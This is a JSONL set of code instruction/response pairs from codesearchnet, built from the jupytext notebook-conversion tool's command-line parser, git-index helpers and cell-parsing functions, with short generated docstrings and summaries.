{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nexecute the given bash command and return the output as a unicode string.", "response": "def system(*args, **kwargs):\n    \"\"\"Execute the given bash command\"\"\"\n    kwargs.setdefault('stdout', subprocess.PIPE)\n    proc = subprocess.Popen(args, **kwargs)\n    out, _ = proc.communicate()\n    if proc.returncode:\n        raise SystemExit(proc.returncode)\n    return out.decode('utf-8')"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef str2bool(value):\n    if value.lower() in ('yes', 'true', 't', 'y', '1'):\n        return True\n    if value.lower() in ('no', 'false', 'f', 'n', '0'):\n        return False\n    if value.lower() in ('d', 'default', ''):\n        return None\n    raise argparse.ArgumentTypeError('Expected: (Y)es/(T)rue/(N)o/(F)alse/(D)efault')", "response": "Parse yes no default string\n   "}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nparsing the arguments passed to the jupytext command line.", "response": "def parse_jupytext_args(args=None):\n    \"\"\"Command line parser for jupytext\"\"\"\n    parser = argparse.ArgumentParser(\n        description='Jupyter notebooks as markdown documents, Julia, Python or R scripts',\n        formatter_class=argparse.RawTextHelpFormatter)\n\n    # Input\n    parser.add_argument('notebooks',\n                        help='One or more notebook(s). Notebook is read from stdin when this argument is empty',\n                        nargs='*')\n    parser.add_argument('--from',\n                        dest='input_format',\n                        help='Optional: jupytext format for the input(s). '\n                             'Inferred from the file extension and content when missing.')\n    parser.add_argument('--pre-commit',\n                        action='store_true',\n                        help='Ignore the notebook argument, and instead apply Jupytext on the notebooks found '\n                             'in the git index, which have an extension that matches the (optional) --from argument.')\n    # Destination format & act on metadata\n    parser.add_argument('--to',\n                        help=\"Destination format: either one of 'notebook', 'markdown', 'rmarkdown', any valid \"\n                             \"notebook extension, or a full format '[prefix_path//][suffix.]ext[:format_name]\")\n    parser.add_argument('--format-options', '--opt',\n                        action='append',\n                        help='Set format options with e.g. --opt comment_magics=true '\n                             '--opt notebook_metadata_filter=-kernelspec.')\n    parser.add_argument('--set-formats',\n                        type=str,\n                        help='Set jupytext.formats metadata to the given value. Use this to activate pairing on a '\n                             'notebook, with e.g. --set-formats ipynb,py:light')\n    parser.add_argument('--update-metadata',\n                        default={},\n                        type=json.loads,\n                        help='Update the notebook metadata with the desired dictionary. Argument must be given in JSON '\n                             'format. For instance, if you want to activate a pairing in the generated file, '\n                             \"\"\"use e.g. '{\"jupytext\":{\"formats\":\"ipynb,py:light\"}}'\"\"\")\n\n    # Destination file\n    parser.add_argument('-o', '--output',\n                        help=\"Destination file. Defaults to the original file, with prefix/suffix/extension changed\"\n                             \"according to the destination format. Use '-' to print the notebook on stdout.\")\n    parser.add_argument('--update', action='store_true',\n                        help='Preserve the output cells when the destination notebook is a .ipynb file '\n                             'that already exists')\n\n    # Action: convert(default)/version/list paired paths/sync/apply/test\n    action = parser.add_mutually_exclusive_group()\n    action.add_argument('--version',\n                        action='store_true',\n                        help=\"Show jupytext's version number and exit\")\n    action.add_argument('--paired-paths', '-p',\n                        help='List the locations of the alternative representations for this notebook.',\n                        action='store_true')\n    action.add_argument('--sync', '-s',\n                        help='Synchronize the content of the paired representations of the given notebook. '\n                             'Input cells are taken from the file that was last modified, and outputs are read '\n                             'from the ipynb file, if present.',\n                        action='store_true')\n    action.add_argument('--test',\n                        action='store_true',\n                        help='Test that notebook is stable under a round trip conversion, up to the expected changes')\n    action.add_argument('--test-strict',\n                        action='store_true',\n                        help='Test that notebook is strictly stable under a round trip conversion')\n    parser.add_argument('--stop', '-x',\n                        dest='stop_on_first_error',\n                        action='store_true',\n                        help='In --test mode, stop on first round trip conversion error, and report stack traceback')\n\n    # Pipe notebook inputs into other commands\n    parser.add_argument('--pipe',\n                        action='append',\n                        help='Pipe the text representation of the notebook into another program, and read the'\n                             'notebook back. For instance, reformat your notebook with:'\n                             \"    jupytext notebook.ipynb --pipe black\"\n                             'If you want to reformat it and sync the paired representation, execute:'\n                             \"    jupytext notebook.ipynb --sync --pipe black\")\n    parser.add_argument('--check',\n                        action='append',\n                        help='Pipe the text representation of the notebook into another program, and test that '\n                             'the returned value is non zero. For instance, test that your notebook is pep8 compliant '\n                             'with:'\n                             \"    jupytext notebook.ipynb --check flake8\")\n    parser.add_argument('--pipe-fmt',\n                        default='auto:percent',\n                        help='The format in which the notebook should be piped to other programs, when using the '\n                             '--pipe and/or --check commands.')\n\n    parser.add_argument('--quiet', '-q',\n                        action='store_true',\n                        default=False,\n                        help='Quiet mode: do not comment about files being updated or created')\n\n    return parser.parse_args(args)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef jupytext(args=None):\n    args = parse_jupytext_args(args)\n\n    def log(text):\n        if not args.quiet:\n            sys.stdout.write(text + '\\n')\n\n    if args.version:\n        log(__version__)\n        return 0\n\n    if args.pre_commit:\n        if args.notebooks:\n            raise ValueError('--pre-commit takes notebooks from the git index. Do not pass any notebook here.')\n        args.notebooks = notebooks_in_git_index(args.input_format)\n        log('[jupytext] Notebooks in git index are:')\n        for nb_file in args.notebooks:\n            log(nb_file)\n\n    def writef_git_add(notebook_, nb_file_, fmt_):\n        writef(notebook_, nb_file_, fmt_)\n        if args.pre_commit:\n            system('git', 'add', nb_file_)\n\n    # Read notebook from stdin\n    if not args.notebooks:\n        if not args.pre_commit:\n            args.notebooks = ['-']\n\n    if args.set_formats is not None:\n        # Replace empty string with None\n        args.update_metadata = recursive_update(args.update_metadata,\n                                                {'jupytext': {'formats': args.set_formats or None}})\n\n    if args.paired_paths:\n        if len(args.notebooks) != 1:\n            raise ValueError('--paired-paths applies to a single notebook')\n        print_paired_paths(args.notebooks[0], args.input_format)\n        return 1\n\n    if not args.to and not args.output and not args.sync \\\n            and not args.pipe and not args.check \\\n            and not args.test and not args.test_strict \\\n            and not args.update_metadata:\n        raise ValueError('Please select an action')\n\n    if args.output and len(args.notebooks) != 1:\n        raise ValueError('Please input a single notebook when using --output')\n\n    if args.input_format:\n        args.input_format = long_form_one_format(args.input_format)\n\n    if args.to:\n        args.to = long_form_one_format(args.to)\n        set_format_options(args.to, args.format_options)\n\n    # Main loop\n    round_trip_conversion_errors = 0\n\n    # Wildcard extension on Windows #202\n    notebooks = []\n    for pattern in args.notebooks:\n        if '*' in pattern or '?' in pattern:\n            notebooks.extend(glob.glob(pattern))\n        else:\n            notebooks.append(pattern)\n\n    for nb_file in notebooks:\n        if nb_file == '-' and args.sync:\n            raise ValueError('Cannot sync a notebook on stdin')\n\n        nb_dest = args.output or (None if not args.to\n                                  else ('-' if nb_file == '-' else\n                                        full_path(base_path(nb_file, args.input_format), args.to)))\n\n        # Just acting on metadata / pipe => save in place\n        if not nb_dest and not args.sync:\n            nb_dest = nb_file\n\n        if nb_dest == '-':\n            args.quiet = True\n\n        # I. ### Read the notebook ###\n        fmt = copy(args.input_format) or {}\n        set_format_options(fmt, args.format_options)\n        log('[jupytext] Reading {}{}'.format(\n            nb_file if nb_file != '-' else 'stdin',\n            ' in format {}'.format(short_form_one_format(fmt)) if 'extension' in fmt else ''))\n\n        notebook = readf(nb_file, fmt)\n        if not fmt:\n            text_representation = notebook.metadata.get('jupytext', {}).get('text_representation', {})\n            ext = os.path.splitext(nb_file)[1]\n            if text_representation.get('extension') == ext:\n                fmt = {key: text_representation[key] for key in text_representation if\n                       key in ['extension', 'format_name']}\n            elif ext:\n                fmt = {'extension': ext}\n\n        # Update the metadata\n        if args.update_metadata:\n            log('[jupytext] Updating notebook metadata with {}'.format(args.update_metadata))\n            # Are we updating a text file that has a metadata filter? #212\n            if fmt['extension'] != '.ipynb' and \\\n                    notebook.metadata.get('jupytext', {}).get('notebook_metadata_filter') == '-all':\n                notebook.metadata.get('jupytext', {}).pop('notebook_metadata_filter')\n            recursive_update(notebook.metadata, args.update_metadata)\n\n        # Read paired notebooks\n        if args.sync:\n            set_prefix_and_suffix(fmt, notebook, nb_file)\n            notebook, inputs_nb_file, outputs_nb_file = load_paired_notebook(notebook, fmt, nb_file, log)\n\n        # II. ### Apply commands onto the notebook ###\n        # Pipe the notebook into the desired commands\n        for cmd in args.pipe or []:\n            notebook = pipe_notebook(notebook, cmd, args.pipe_fmt)\n\n        # and/or test the desired commands onto the notebook\n        for cmd in args.check or []:\n            pipe_notebook(notebook, cmd, args.pipe_fmt, update=False)\n\n        # III. ### Possible actions ###\n        modified = args.update_metadata or args.pipe\n        # a. Test round trip conversion\n        if args.test or args.test_strict:\n            try:\n                test_round_trip_conversion(notebook, args.to,\n                                           update=args.update,\n                                           allow_expected_differences=not args.test_strict,\n                                           stop_on_first_error=args.stop_on_first_error)\n            except NotebookDifference as err:\n                round_trip_conversion_errors += 1\n                sys.stdout.write('{}: {}'.format(nb_file, str(err)))\n            continue\n\n        # b. Output to the desired file or format\n        if nb_dest:\n            if nb_dest == nb_file and not args.to:\n                args.to = fmt\n\n            # Test consistency between dest name and output format\n            if args.to and nb_dest != '-':\n                base_path(nb_dest, args.to)\n\n            # Describe what jupytext is doing\n            if os.path.isfile(nb_dest) and args.update:\n                if not nb_dest.endswith('.ipynb'):\n                    raise ValueError('--update is only for ipynb files')\n                action = ' (destination file updated)'\n                check_file_version(notebook, nb_file, nb_dest)\n                combine_inputs_with_outputs(notebook, readf(nb_dest), fmt)\n            elif os.path.isfile(nb_dest):\n                action = ' (destination file replaced)'\n            else:\n                action = ''\n\n            log('[jupytext] Writing {nb_dest}{format}{action}'\n                .format(nb_dest=nb_dest,\n                        format=' in format ' + short_form_one_format(\n                            args.to) if args.to and 'format_name' in args.to else '',\n                        action=action))\n            writef_git_add(notebook, nb_dest, args.to)\n\n        # c. Synchronize paired notebooks\n        if args.sync:\n            # Also update the original notebook if the notebook was modified\n            if modified:\n                inputs_nb_file = outputs_nb_file = None\n            formats = notebook.metadata['jupytext']['formats']\n\n            for ipynb in [True, False]:\n                # Write first format last so that it is the most recent file\n                for alt_path, alt_fmt in paired_paths(nb_file, fmt, formats)[::-1]:\n                    # Write ipynb first for compatibility with our contents manager\n                    if alt_path.endswith('.ipynb') != ipynb:\n                        continue\n                    # Do not write the ipynb file if it was not modified\n                    # But, always write text representations to make sure they are the most recent\n                    if alt_path == inputs_nb_file and alt_path == outputs_nb_file:\n                        continue\n                    log(\"[jupytext] Updating '{}'\".format(alt_path))\n                    writef_git_add(notebook, alt_path, alt_fmt)\n\n    return round_trip_conversion_errors", "response": "Internal implementation of Jupytext command line"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn the list of modified and deleted ipynb files in the git index that match the given format", "response": "def notebooks_in_git_index(fmt):\n    \"\"\"Return the list of modified and deleted ipynb files in the git index that match the given format\"\"\"\n    git_status = system('git', 'status', '--porcelain')\n    re_modified = re.compile(r'^[AM]+\\s+(?P<name>.*)', re.MULTILINE)\n    modified_files_in_git_index = re_modified.findall(git_status)\n    files = []\n    for nb_file in modified_files_in_git_index:\n        if nb_file.startswith('\"') and nb_file.endswith('\"'):\n            nb_file = nb_file[1:-1]\n        try:\n            base_path(nb_file, fmt)\n            files.append(nb_file)\n        except InconsistentPath:\n            continue\n    return files"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef print_paired_paths(nb_file, fmt):\n    notebook = readf(nb_file, fmt)\n    formats = notebook.metadata.get('jupytext', {}).get('formats')\n    if formats:\n        for path, _ in paired_paths(nb_file, fmt, formats):\n            if path != nb_file:\n                sys.stdout.write(path + '\\n')", "response": "Print the paired paths for this notebook"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef recursive_update(target, update):\n    for key in update:\n        value = update[key]\n        if value is None:\n            del target[key]\n        elif isinstance(value, dict):\n            target[key] = recursive_update(target.get(key, {}), value)\n        else:\n            target[key] = value\n    return target", "response": "Recursively updates a nested dictionary with the content of another."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef set_format_options(fmt, format_options):\n    if not format_options:\n        return\n\n    for opt in format_options:\n        try:\n            key, value = opt.split('=')\n        except ValueError:\n            raise ValueError(\"Format options are expected to be of the form key=value, not '{}'\".format(opt))\n\n        if key not in _VALID_FORMAT_OPTIONS:\n            raise ValueError(\"'{}' is not a valid format option. Expected one of '{}'\"\n                             .format(key, \"', '\".join(_VALID_FORMAT_OPTIONS)))\n\n        if key in _BINARY_FORMAT_OPTIONS:\n            value = str2bool(value)\n\n        fmt[key] = value", "response": "Apply the desired format options to the format description fmt"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef set_prefix_and_suffix(fmt, notebook, nb_file):\n    for alt_fmt in long_form_multiple_formats(notebook.metadata.get('jupytext', {}).get('formats')):\n        if (alt_fmt['extension'] == fmt['extension']\n                and fmt.get('format_name') == alt_fmt.get('format_name')):\n            try:\n                base_path(nb_file, alt_fmt)\n                fmt.update(alt_fmt)\n                return\n            except InconsistentPath:\n                continue", "response": "Add prefix and suffix information from jupytext. formats."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nload the notebook with the inputs and outputs of the most recent paired files", "response": "def load_paired_notebook(notebook, fmt, nb_file, log):\n    \"\"\"Update the notebook with the inputs and outputs of the most recent paired files\"\"\"\n    formats = notebook.metadata.get('jupytext', {}).get('formats')\n\n    if not formats:\n        raise ValueError(\"'{}' is not a paired notebook\".format(nb_file))\n\n    max_mtime_inputs = None\n    max_mtime_outputs = None\n    latest_inputs = None\n    latest_outputs = None\n    for alt_path, alt_fmt in paired_paths(nb_file, fmt, formats):\n        if not os.path.isfile(alt_path):\n            continue\n        info = os.lstat(alt_path)\n        if not max_mtime_inputs or info.st_mtime > max_mtime_inputs:\n            max_mtime_inputs = info.st_mtime\n            latest_inputs, input_fmt = alt_path, alt_fmt\n\n        if alt_path.endswith('.ipynb'):\n            if not max_mtime_outputs or info.st_mtime > max_mtime_outputs:\n                max_mtime_outputs = info.st_mtime\n                latest_outputs = alt_path\n\n    if latest_outputs and latest_outputs != latest_inputs:\n        log(\"[jupytext] Loading input cells from '{}'\".format(latest_inputs))\n        inputs = notebook if latest_inputs == nb_file else readf(latest_inputs, input_fmt)\n        check_file_version(inputs, latest_inputs, latest_outputs)\n        log(\"[jupytext] Loading output cells from '{}'\".format(latest_outputs))\n        outputs = notebook if latest_outputs == nb_file else readf(latest_outputs)\n        combine_inputs_with_outputs(inputs, outputs, input_fmt)\n        return inputs, latest_inputs, latest_outputs\n\n    log(\"[jupytext] Loading notebook from '{}'\".format(latest_inputs))\n    if latest_inputs != nb_file:\n        notebook = readf(latest_inputs, input_fmt)\n    return notebook, latest_inputs, latest_outputs"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef pipe_notebook(notebook, command, fmt='py:percent', update=True, preserve_outputs=True):\n    if command in ['black', 'flake8', 'autopep8']:\n        command = command + ' -'\n\n    fmt = long_form_one_format(fmt, notebook.metadata)\n    text = writes(notebook, fmt)\n    process = subprocess.Popen(command.split(' '), stdout=subprocess.PIPE, stdin=subprocess.PIPE)\n    cmd_output, err = process.communicate(input=text.encode('utf-8'))\n\n    if process.returncode:\n        sys.stderr.write(\"Command '{}' exited with code {}: {}\"\n                         .format(command, process.returncode, err or cmd_output))\n        raise SystemExit(process.returncode)\n\n    if not update:\n        return notebook\n\n    if not cmd_output:\n        sys.stderr.write(\"[jupytext] The command '{}' had no output. As a result, the notebook is empty. \"\n                         \"Is this expected? If not, use --check rather than --pipe for this command.\".format(command))\n\n    piped_notebook = reads(cmd_output.decode('utf-8'), fmt)\n\n    if preserve_outputs:\n        combine_inputs_with_outputs(piped_notebook, notebook, fmt)\n\n    # Remove jupytext / text_representation entry\n    piped_notebook.metadata.pop('jupytext')\n    if 'jupytext' in notebook.metadata:\n        piped_notebook.metadata['jupytext'] = notebook.metadata['jupytext']\n\n    return piped_notebook", "response": "Pipe the notebook in the desired representation to the given command. Update the notebook with the returned content if desired."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nremove prefix and space or only prefix when possible", "response": "def uncomment(lines, prefix='#'):\n    \"\"\"Remove prefix and space, or only prefix, when possible\"\"\"\n    if not prefix:\n        return lines\n    prefix_and_space = prefix + ' '\n    length_prefix = len(prefix)\n    length_prefix_and_space = len(prefix_and_space)\n    return [line[length_prefix_and_space:] if line.startswith(prefix_and_space)\n            else (line[length_prefix:] if line.startswith(prefix) else line)\n            for line in lines]"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef paragraph_is_fully_commented(lines, comment, main_language):\n    for i, line in enumerate(lines):\n        if line.startswith(comment):\n            if line.startswith((comment + ' %', comment + ' ?', comment + ' !')) and is_magic(line, main_language):\n                return False\n            continue\n        return i > 0 and _BLANK_LINE.match(line)\n    return True", "response": "Is the paragraph fully commented?"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nis the next unescaped line indented?", "response": "def next_code_is_indented(lines):\n    \"\"\"Is the next unescaped line indented?\"\"\"\n    for line in lines:\n        if _BLANK_LINE.match(line) or _PY_COMMENT.match(line):\n            continue\n        return _PY_INDENTED.match(line)\n    return False"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef count_lines_to_next_cell(cell_end_marker, next_cell_start, total, explicit_eoc):\n    if cell_end_marker < total:\n        lines_to_next_cell = next_cell_start - cell_end_marker\n        if explicit_eoc:\n            lines_to_next_cell -= 1\n        if next_cell_start >= total:\n            lines_to_next_cell += 1\n        return lines_to_next_cell\n\n    return 1", "response": "Count how many blank lines between end of cell marker and next cell?"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef last_two_lines_blank(source):\n    if len(source) < 3:\n        return False\n    return not _BLANK_LINE.match(source[-3]) and _BLANK_LINE.match(source[-2]) and _BLANK_LINE.match(source[-1])", "response": "Are the two last lines blank and not the third last one?"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreads one cell from the given lines and return the cell and the position of the next cell plus the position of the next cell.", "response": "def read(self, lines):\n        \"\"\"Read one cell from the given lines, and return the cell,\n        plus the position of the next cell\n        \"\"\"\n\n        # Do we have an explicit code marker on the first line?\n        self.metadata_and_language_from_option_line(lines[0])\n\n        if self.metadata and 'language' in self.metadata:\n            self.language = self.metadata.pop('language')\n\n        # Parse cell till its end and set content, lines_to_next_cell\n        pos_next_cell = self.find_cell_content(lines)\n\n        if self.cell_type == 'code':\n            new_cell = new_code_cell\n        elif self.cell_type == 'markdown':\n            new_cell = new_markdown_cell\n        else:\n            new_cell = new_raw_cell\n\n        if not self.metadata:\n            self.metadata = {}\n\n        if self.ext == '.py':\n            expected_blank_lines = pep8_lines_between_cells(self.org_content or [''], lines[pos_next_cell:], self.ext)\n        else:\n            expected_blank_lines = 1\n\n        if self.lines_to_next_cell != expected_blank_lines:\n            self.metadata['lines_to_next_cell'] = self.lines_to_next_cell\n\n        if self.language:\n            self.metadata['language'] = self.language\n\n        return new_cell(source='\\n'.join(self.content), metadata=self.metadata), pos_next_cell"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef metadata_and_language_from_option_line(self, line):\n        if self.start_code_re.match(line):\n            self.language, self.metadata = self.options_to_metadata(self.start_code_re.findall(line)[0])", "response": "Parse code cell options on the given line and set self. metadata and self. language."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nparsing the cell till its end and set content and metadata to dict.", "response": "def find_cell_content(self, lines):\n        \"\"\"Parse cell till its end and set content, lines_to_next_cell.\n        Return the position of next cell start\"\"\"\n        cell_end_marker, next_cell_start, self.explicit_eoc = self.find_cell_end(lines)\n\n        # Metadata to dict\n        if self.metadata is None:\n            cell_start = 0\n            self.metadata = {}\n        else:\n            cell_start = 1\n\n        # Cell content\n        source = lines[cell_start:cell_end_marker]\n        self.org_content = [line for line in source]\n\n        # Exactly two empty lines at the end of cell (caused by PEP8)?\n        if self.ext == '.py' and self.explicit_eoc:\n            if last_two_lines_blank(source):\n                source = source[:-2]\n                lines_to_end_of_cell_marker = 2\n            else:\n                lines_to_end_of_cell_marker = 0\n\n            pep8_lines = pep8_lines_between_cells(source, lines[cell_end_marker:], self.ext)\n            if lines_to_end_of_cell_marker != (0 if pep8_lines == 1 else 2):\n                self.metadata['lines_to_end_of_cell_marker'] = lines_to_end_of_cell_marker\n\n        if not is_active(self.ext, self.metadata) or \\\n                ('active' not in self.metadata and self.language and self.language != self.default_language):\n            self.content = uncomment(source, self.comment if self.ext not in ['.r', '.R'] else '#')\n        else:\n            self.content = self.uncomment_code_and_magics(source)\n\n        # Is this a raw cell?\n        if ('active' in self.metadata and not is_active('ipynb', self.metadata)) or \\\n                (self.ext == '.md' and self.cell_type == 'code' and self.language is None):\n            if self.metadata.get('active') == '':\n                del self.metadata['active']\n            self.cell_type = 'raw'\n\n        # Explicit end of cell marker?\n        if (next_cell_start + 1 < len(lines) and\n                _BLANK_LINE.match(lines[next_cell_start]) and\n                not _BLANK_LINE.match(lines[next_cell_start + 1])):\n            next_cell_start += 1\n        elif (self.explicit_eoc and next_cell_start + 2 < len(lines) and\n              _BLANK_LINE.match(lines[next_cell_start]) and\n              _BLANK_LINE.match(lines[next_cell_start + 1]) and\n              not _BLANK_LINE.match(lines[next_cell_start + 2])):\n            next_cell_start += 2\n\n        self.lines_to_next_cell = count_lines_to_next_cell(\n            cell_end_marker,\n            next_cell_start,\n            len(lines),\n            self.explicit_eoc)\n\n        return next_cell_start"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef find_cell_end(self, lines):\n        if self.in_region:\n            self.cell_type = 'markdown'\n            for i, line in enumerate(lines):\n                if self.end_region_re.match(line):\n                    return i, i + 1, True\n        elif self.metadata is None:\n            # default markdown: (last) two consecutive blank lines, except when in code blocks\n            self.cell_type = 'markdown'\n            prev_blank = 0\n            in_explicit_code_block = False\n            in_indented_code_block = False\n\n            for i, line in enumerate(lines):\n                if in_explicit_code_block and self.end_code_re.match(line):\n                    in_explicit_code_block = False\n                    continue\n\n                if self.non_jupyter_code_re and self.non_jupyter_code_re.match(line):\n                    in_explicit_code_block = True\n                    prev_blank = 0\n                    continue\n\n                if prev_blank and line.startswith('    ') and not _BLANK_LINE.match(line):\n                    in_indented_code_block = True\n                    prev_blank = 0\n                    continue\n\n                if in_indented_code_block and not _BLANK_LINE.match(line) and not line.startswith('    '):\n                    in_indented_code_block = False\n\n                if in_indented_code_block or in_explicit_code_block:\n                    continue\n\n                if self.start_code_re.match(line) or self.start_region_re.match(line):\n                    if i > 1 and prev_blank:\n                        return i - 1, i, False\n                    return i, i, False\n\n                if self.split_at_heading and line.startswith('#') and prev_blank >= 1:\n                    return i - 1, i, False\n\n                if _BLANK_LINE.match(lines[i]):\n                    prev_blank += 1\n                elif i > 2 and prev_blank >= 2:\n                    return i - 2, i, True\n                else:\n                    prev_blank = 0\n        else:\n            self.cell_type = 'code'\n            for i, line in enumerate(lines):\n                # skip cell header\n                if i == 0:\n                    continue\n                if self.end_code_re.match(line):\n                    return i, i + 1, True\n\n        # End not found\n        return len(lines), len(lines), False", "response": "Find the end of the cell marker and return the position of the first line after the cell marker and the position of the first line after the cell marker."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef find_cell_end(self, lines):\n        if self.metadata is None and lines[0].startswith(\"#'\"):\n            self.cell_type = 'markdown'\n            for i, line in enumerate(lines):\n                if not line.startswith(\"#'\"):\n                    if _BLANK_LINE.match(line):\n                        return i, i + 1, False\n                    return i, i, False\n\n            return len(lines), len(lines), False\n\n        if self.metadata and 'cell_type' in self.metadata:\n            self.cell_type = self.metadata.pop('cell_type')\n        else:\n            self.cell_type = 'code'\n\n        parser = StringParser(self.language or self.default_language)\n        for i, line in enumerate(lines):\n            # skip cell header\n            if self.metadata is not None and i == 0:\n                continue\n\n            if parser.is_quoted():\n                parser.read_line(line)\n                continue\n\n            parser.read_line(line)\n\n            if self.start_code_re.match(line) or (self.markdown_prefix and line.startswith(self.markdown_prefix)):\n                if i > 0 and _BLANK_LINE.match(lines[i - 1]):\n                    if i > 1 and _BLANK_LINE.match(lines[i - 2]):\n                        return i - 2, i, False\n                    return i - 1, i, False\n                return i, i, False\n\n            if _BLANK_LINE.match(line):\n                if not next_code_is_indented(lines[i:]):\n                    if i > 0:\n                        return i, i + 1, False\n                    if len(lines) > 1 and not _BLANK_LINE.match(lines[1]):\n                        return 1, 1, False\n                    return 1, 2, False\n\n        return len(lines), len(lines), False", "response": "Return the position of the end of the cell marker and position of the first line after the cell marker and the position of the first line after the cell marker."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef find_cell_end(self, lines):\n        if self.metadata is None and not (self.cell_marker_end and self.end_code_re.match(lines[0])) \\\n                and paragraph_is_fully_commented(lines, self.comment, self.default_language):\n            self.cell_type = 'markdown'\n            for i, line in enumerate(lines):\n                if _BLANK_LINE.match(line):\n                    return i, i + 1, False\n            return len(lines), len(lines), False\n\n        if self.metadata is None:\n            self.end_code_re = None\n        elif not self.cell_marker_end:\n            end_of_cell = self.metadata.get('endofcell', '-')\n            self.end_code_re = re.compile('^' + self.comment + ' ' + end_of_cell + r'\\s*$')\n\n        return self.find_region_end(lines)", "response": "Return position of end of cell marker and position of first line after cell"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef find_region_end(self, lines):\n        if self.metadata and 'cell_type' in self.metadata:\n            self.cell_type = self.metadata.pop('cell_type')\n        else:\n            self.cell_type = 'code'\n\n        parser = StringParser(self.language or self.default_language)\n        for i, line in enumerate(lines):\n            # skip cell header\n            if self.metadata is not None and i == 0:\n                continue\n\n            if parser.is_quoted():\n                parser.read_line(line)\n                continue\n\n            parser.read_line(line)\n\n            # New code region\n            # Simple code pattern in LightScripts must be preceded with a blank line\n            if self.start_code_re.match(line) or (\n                    self.simple_start_code_re and self.simple_start_code_re.match(line) and\n                    (self.cell_marker_start or i == 0 or _BLANK_LINE.match(lines[i - 1]))):\n\n                if self.explicit_end_marker_required:\n                    # Metadata here was conditioned on finding an explicit end marker\n                    # before the next start marker. So we dismiss it.\n                    self.metadata = None\n                    self.language = None\n\n                if i > 0 and _BLANK_LINE.match(lines[i - 1]):\n                    if i > 1 and _BLANK_LINE.match(lines[i - 2]):\n                        return i - 2, i, False\n                    return i - 1, i, False\n                return i, i, False\n\n            if not self.ignore_end_marker and self.end_code_re:\n                if self.end_code_re.match(line):\n                    return i, i + 1, True\n            elif _BLANK_LINE.match(line):\n                if not next_code_is_indented(lines[i:]):\n                    if i > 0:\n                        return i, i + 1, False\n                    if len(lines) > 1 and not _BLANK_LINE.match(lines[1]):\n                        return 1, 1, False\n                    return 1, 2, False\n\n        return len(lines), len(lines), False", "response": "Find the end of the region started with start and end markers."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef metadata_and_language_from_option_line(self, line):\n        if self.start_code_re.match(line):\n            self.language, self.metadata = self.options_to_metadata(line[line.find('%%') + 2:])\n        elif self.alternative_start_code_re.match(line):\n            self.metadata = {}", "response": "Parse code cell options on the given line."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef find_cell_content(self, lines):\n        cell_end_marker, next_cell_start, explicit_eoc = self.find_cell_end(lines)\n\n        # Metadata to dict\n        if self.start_code_re.match(lines[0]) or self.alternative_start_code_re.match(lines[0]):\n            cell_start = 1\n        else:\n            cell_start = 0\n\n        # Cell content\n        source = lines[cell_start:cell_end_marker]\n        self.org_content = [line for line in source]\n\n        if self.cell_type != 'code' or (self.metadata and not is_active('py', self.metadata)) \\\n                or (self.language is not None and self.language != self.default_language):\n            source = uncomment(source, self.comment)\n        elif self.metadata is not None and self.comment_magics:\n            source = self.uncomment_code_and_magics(source)\n\n        self.content = source\n\n        self.lines_to_next_cell = count_lines_to_next_cell(\n            cell_end_marker,\n            next_cell_start,\n            len(lines),\n            explicit_eoc)\n\n        return next_cell_start", "response": "Parse the cell till its end and set content lines_to_next_cell."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns position of end of cell marker and position of first line after cell marker", "response": "def find_cell_end(self, lines):\n        \"\"\"Return position of end of cell marker, and position\n        of first line after cell\"\"\"\n\n        if self.metadata and 'cell_type' in self.metadata:\n            self.cell_type = self.metadata.pop('cell_type')\n        else:\n            self.cell_type = 'code'\n\n        next_cell = len(lines)\n        for i, line in enumerate(lines):\n            if i > 0 and (self.start_code_re.match(line) or self.alternative_start_code_re.match(line)):\n                next_cell = i\n                break\n\n        if last_two_lines_blank(lines[:next_cell]):\n            return next_cell - 2, next_cell, False\n        if next_cell > 0 and _BLANK_LINE.match(lines[next_cell - 1]):\n            return next_cell - 1, next_cell, False\n        return next_cell, next_cell, False"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ndoing this line start a new markdown cell? Then return the cell marker", "response": "def start_of_new_markdown_cell(self, line):\n        \"\"\"Does this line starts a new markdown cell?\n        Then, return the cell marker\"\"\"\n        for empty_markdown_cell in ['\"\"', \"''\"]:\n            if line == empty_markdown_cell:\n                return empty_markdown_cell\n\n        for triple_quote in ['\"\"\"', \"'''\"]:\n            if line.startswith(triple_quote):\n                return triple_quote\n\n        if self.twenty_hash.match(line):\n            return line\n\n        return None"}
